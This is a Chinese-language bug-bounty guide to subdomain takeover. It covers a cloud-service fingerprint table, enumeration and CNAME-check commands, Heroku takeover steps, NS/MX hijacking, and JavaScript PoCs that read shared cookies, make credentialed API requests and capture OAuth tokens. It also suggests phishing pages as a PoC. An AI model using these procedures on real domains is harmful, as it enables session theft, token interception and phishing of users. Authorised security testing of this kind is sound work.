# 子域名接管 (Subdomain Takeover)

> **定位**: 资产层漏洞, 非传统应用漏洞, 但赏金高且易被忽视。
> **CWE**: CWE-350 | **OWASP**: WSTG-CONFIG-10 / A05:2021
> **回报**: $500-$5000 基础 / 若能承接敏感子域 $10000+
> **原理**: DNS CNAME 仍指向云服务, 但云服务上的资源已被释放/删除 → 攻击者注册同名资源接管

---

## 0. 核心逻辑

```
your-app.target.com   →  CNAME  →  abandoned.herokuapp.com  (已释放)
                                    ↓
                        攻击者在 Heroku 注册同名 App
                                    ↓
                        访问 your-app.target.com 返回攻击者内容
                                    ↓
                        → Cookie 窃取 / 钓鱼 / 同源策略绕过 / OAuth 回调劫持
```

---

## 1. 核心攻击流程

```
Step 1: 枚举 target.com 所有子域(被动+主动)
Step 2: 过滤出有 CNAME 指向第三方云服务的子域
Step 3: 访问子域, 观察返回的 "fingerprint"(如 Heroku 的 404 页)
Step 4: 在对应云厂商注册同名资源
Step 5: 验证接管, 构造 PoC
```

---

## 2. 已知可接管服务指纹矩阵 (Takeover Fingerprints)

> 自动化检测推荐: `nuclei -tags takeover -l subs.txt` 或 `subjack -w subs.txt -t 100 -ssl -c ~/subjack_fingerprints.json`
> 指纹库官方源: https://github.com/EdOverflow/can-i-take-over-xyz

| 云服务 | CNAME 指向 | 指纹(404 / 错误页特征) | 可接管? |
|--------|-----------|----------------------|--------|
| **AWS S3** | `*.s3.amazonaws.com` / `*.s3-website-*.amazonaws.com` | `The specified bucket does not exist` / `NoSuchBucket` | ✓ 注册同名 bucket |
| **AWS CloudFront** | `*.cloudfront.net` | `Bad request. We can't connect to the server for this app` | △ 需满足区域条件 |
| **GitHub Pages** | `*.github.io` | `There isn't a GitHub Pages site here` | ✓ Fork/Create 同名仓库 |
| **Heroku** | `*.herokuapp.com` | `No such app` / `herokucdn.com/error-pages/no-such-app.html` | ✓ 创建同名 App |
| **Fastly** | `*.fastly.net` | `Fastly error: unknown domain` | ✓ 注册同名服务 |
| **Azure** | `*.cloudapp.net` / `*.cloudapp.azure.com` / `*.azurewebsites.net` | `404 Web Site not found` | ✓ 注册同名 |
| **Tumblr** | `*.tumblr.com` | `Whatever you were looking for doesn't currently exist` | ✓ 注册博客名 |
| **Shopify** | `*.myshopify.com` | `Sorry, this shop is currently unavailable` | ✓ 注册店铺名 |
| **Zendesk** | `*.zendesk.com` | `Help Center Closed` | ✓ 注册 subdomain |
| **WordPress** | `*.wordpress.com` | `Do you want to register <subdomain>.wordpress.com?` | ✓ 注册 |
| **Surge.sh** | `*.surge.sh` | `project not found` | ✓ surge publish |
| **Pantheon** | `*.pantheonsite.io` | `The gods are wise, but do not know of the site which you seek.` | ✓ 注册 |
| **Ghost** | `*.ghost.io` | `The thing you were looking for is no longer here...` | ✓ |
| **Campaign Monitor** | `*.createsend.com` | `Trying to access your account?` | ✓ |
| **Help Scout** | `*.helpscoutdocs.com` | `No settings were found for this company` | ✓ |
| **UserVoice** | `*.uservoice.com` | `This UserVoice subdomain is currently available!` | ✓ |
| **Acquia** | `*.acquia-sites.com` | `The site you are looking for could not be found` | ✓ |
| **Squarespace** | `*.squarespace.com` | `404 Not Found` + 页面特征 | △ |
| **Ngrok** | `*.ngrok.io` | `Tunnel <name>.ngrok.io not found` | ✓ |
| **Bitbucket** | `*.bitbucket.io` | `Repository not found` | ✓ |
| **Intercom** | `custom.intercom.help` | `Uh oh. That page doesn't exist.` | ✓ |
| **Unbounce** | `*.unbouncepages.com` | `The requested URL was not found on this server.` | △ |
| **Readme.io** | `*.readme.io` | `Project doesnt exist... yet!` | ✓ |
| **LaunchRock** | `*.launchrock.com` | 通用错误页 | △ |
| **Tilda** | `*.tilda.ws` | `Please renew your subscription` | △ |
| **Webflow** | `*.webflow.io` | `The page you are looking for doesn't exist` | △ |
| **Netlify** | `*.netlify.com/*.netlify.app` | `Not Found` 页 | ✓ 需 DNS 配合 |
| **Vercel (Zeit Now)** | `*.vercel.app / *.now.sh` | `404: NOT_FOUND` | △ |

---

## 3. 探测流程

### 3.1 枚举子域

```bash
# 被动
subfinder -d target.com -silent -o subs.txt
amass enum -passive -d target.com -o amass.txt

# 证书透明度
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u >> crt.txt

# 合并
cat subs.txt amass.txt crt.txt | sort -u > all_subs.txt
```

### 3.2 检查 CNAME

```bash
# 批量查 CNAME
for sub in $(cat all_subs.txt); do
    cname=$(dig +short CNAME "$sub" | head -1)
    [ -n "$cname" ] && echo "$sub -> $cname"
done | tee cnames.txt

# 只保留指向第三方云服务的
grep -E "(herokuapp|github\.io|cloudfront|azurewebsites|s3\.amazonaws|surge\.sh|tumblr|shopify|zendesk|wordpress|pantheon|ghost\.io|myshopify|createsend|helpscoutdocs|uservoice|acquia|ngrok|bitbucket\.io|intercom|readme\.io|fastly|vercel|netlify|webflow|unbouncepages|launchrock|tilda)" cnames.txt > candidates.txt
```

### 3.3 自动化工具

```bash
# subjack (Go, 速度快)
subjack -w all_subs.txt -t 100 -timeout 30 -o results.txt -ssl

# nuclei 模板
nuclei -l all_subs.txt -t takeovers/ -o nuclei_takeover.txt

# SubOver
./SubOver -l all_subs.txt -t 100

# takeover (Rust)
takeover --input all_subs.txt
```

### 3.4 手工验证

```bash
# 1. 解析 CNAME
dig +short CNAME app.target.com
# → abandoned-app.herokuapp.com

# 2. 访问该 CNAME
curl -I https://abandoned-app.herokuapp.com
# → 404 + No such app 指纹 = 可接管

# 3. 再通过原子域访问确认
curl -H "Host: app.target.com" https://abandoned-app.herokuapp.com
# → 同样返回可接管指纹
```

---

## 4. 接管步骤(以 Heroku 为例)

```bash
# 1. 注册 Heroku 账号
heroku login

# 2. 创建同名 App
heroku create abandoned-app
# 若提示 "Name is already taken" → 说明已被合法占用, 无法接管
# 若提示 "Creating app... done" → 接管成功

# 3. 部署简单页面
cat > index.html <<EOF
<h1>Subdomain Takeover PoC</h1>
<p>This subdomain (app.target.com) was taken over via abandoned Heroku app.</p>
EOF

git init && git add . && git commit -m "PoC"
heroku git:remote -a abandoned-app
git push heroku master

# 4. 验证
curl https://app.target.com
# → 返回 PoC 页面
```

---

## 5. NS 接管(比 CNAME 更严重)

若子域 NS 记录仍指向一个未注册的 DNS 服务, 攻击者可劫持整条解析链:

```bash
dig NS old.target.com
# → ns1.abandoned-dns.com  (该域未注册)

# 攻击者注册 abandoned-dns.com, 添加 A 记录
# old.target.com 的所有解析被攻击者控制
```

工具: `nsbrute.py` / `dnsgen` + 验证域名注册状态。

---

## 6. MX / TXT 记录劫持

| 类型 | 利用 |
|------|------|
| MX 指向 abandoned email 服务 | 接管邮件 → 接收密码重置 |
| TXT SPF 包含 abandoned 第三方域 | 邮件仿冒绕过 |
| TXT DKIM 指向 abandoned 第三方 | 邮件签名劫持 |

---

## 7. 影响矩阵

| 接管层级 | 影响 | 赏金梯度 |
|---------|------|----------|
| 静态页面子域(无 Cookie/OAuth) | 钓鱼, 品牌冒用 | 低/中 |
| 共享 `*.target.com` Cookie | 窃取主站 Cookie | 高 |
| OAuth 回调子域 | 拦截 Token | 严重 |
| API 子域 | 伪造 API, 诱导客户端 | 严重 |
| NS 记录接管 | 整条子域解析被控 | 严重 |
| 邮件相关 (MX/SPF) | 接管密码重置流程 | 严重 |

---

## 8. 常见赏金冲突

### 8.1 静态内容 vs 作用域内

**赏金平台常规定**: 纯静态页接管, 不影响用户数据, 仅算 "低", 但若:
- 该子域在 Cookie Domain = `.target.com` 下能读共享 Cookie
- 该子域是 OAuth redirect_uri 白名单
- 该子域是 CSP `script-src` 允许源
- 该子域显示在邮件模板中

**任意一条 → 升级为 "严重"**

### 8.2 PoC 技巧

```html
<!-- 展示能读同源 cookie -->
<script>document.write("Cookie: " + document.cookie)</script>

<!-- 展示能发跨域请求(同 .target.com) -->
<script>
fetch('https://api.target.com/user', {credentials: 'include'})
  .then(r => r.text()).then(t => document.body.innerText = t);
</script>

<!-- OAuth 回调劫持 -->
<script>
if (location.hash) console.log("Captured OAuth token: " + location.hash);
</script>
```

---

## 9. Testing Checklist

- [ ] 穷举所有子域 (passive + active + cert transparency)
- [ ] 批量 dig CNAME 过滤第三方云指向
- [ ] 逐个访问候选子域, 看指纹匹配
- [ ] subjack / nuclei 双工具交叉验证
- [ ] 尝试注册该云服务的同名资源
- [ ] 接管后提升危害: Cookie 共享 / OAuth 回调 / CSP 白名单
- [ ] 检查 NS 记录是否指向未注册的 DNS 服务(比 CNAME 更严重)
- [ ] 检查 MX 记录
- [ ] 检查 DMARC / SPF / DKIM 是否引用 abandoned 域名

---

## 10. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| 返回 404 + 没有指纹 | 不等于可接管, 该云服务可能拒绝同名注册 |
| Dangling CNAME 但无法注册 | 有些云(CloudFront/Vercel)需要账号验证或锁定前缀 |
| NS 记录过时但 DNS 仍能解析 | 不代表可接管, 需验证该 NS 服务器可注册 |
| 子域返回 HTTPS 但证书错误 | 只是证书配置不当, 未必可接管 |
| 看起来可接管但实际是 CDN 缓存 | 等 TTL 过期再试, 或确认 origin |

**黄金验证**: **真的去注册**一个资源, 返回 "Name available" 才算确认。

---

## 11. 影响证明

**低等级 PoC**: 接管后返回自定义 HTML。

**高等级 PoC**(冲赏金):
1. 在被接管子域托管钓鱼页, 诱导用户输入主站凭证
2. 读取共享 Cookie (`.target.com` domain) → 截图
3. 劫持 OAuth redirect_uri → 截获 access_token
4. 被接管子域在 CSP `script-src` 白名单 → 绕过主站 XSS 保护

---

## 12. 相关参考

| 内容 | 文件 |
|------|------|
| 子域枚举(上游) | [../recon.md](../recon.md) §被动信息收集 |
| CORS(共享域利用) | [cors-cache.md](cors-cache.md) |
| OAuth 回调劫持 | [../api-security.md](../api-security.md) §OAuth |

---

**CWE**: CWE-350 | **OWASP**: WSTG-CONFIG-10 | **CVSS 典型**: 8.1 (Cookie 共享) / 9.6 (OAuth 回调劫持)
